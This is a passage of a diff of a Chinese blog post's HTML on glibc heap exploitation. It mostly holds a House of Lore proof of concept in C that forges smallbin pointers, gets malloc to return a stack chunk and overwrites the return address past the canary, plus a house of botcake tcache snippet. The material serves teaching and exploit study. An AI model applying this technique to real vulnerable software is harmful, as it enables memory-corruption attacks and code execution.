class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>一样的上面的poc确实写的非常详细，自己下去调</p>
@@ -262,12 +333,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="keyword">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> offset = (<span class="keyword">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="keyword">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到，他这里是创建了一个假的fake_freelist，这个的作用就是到最后while循环时，将所有内容放入到tcache中，不然会引起崩溃</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220303160743463.png"
-                      alt="image-20220303160743463"
-                ></p>
+<p><img   src="/images/image-20220303160743463.png"  alt="image-20220303160743463"></p>
 <h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>在glibc2.27里的tcache是什么验证都没加</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -294,197 +360,301 @@
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap" >https://github.com/shellphish/how2heap<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/218887" >https://www.anquanke.com/post/id/218887<i class="fas fa-external-link-alt"></i></a></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/03/07/house-of-banana/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">house of banana</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/house-of-%E7%B3%BB%E5%88%97/">house of 系列</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/house-of-force/">house of force</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/house-of-lora/">house of lora</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/house-of-botcake/">house of botcake</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/house-of-orange/">house of orange</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/03/01/SROP/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">SROP</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/03/07/house-of-banana/"
+                                   title="house of banana"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">house of banana</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/03/01/SROP/"
+                                   title="SROP"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">SROP</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-force"><span class="nav-text">house of force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-lora"><span class="nav-text">house of lora</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc2-23"><span class="nav-text">Glibc2.23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc-2-27%E5%90%8E"><span class="nav-text">Glibc 2.27后</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-botcake"><span class="nav-text">house of botcake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-orange"><span class="nav-text">house of orange</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
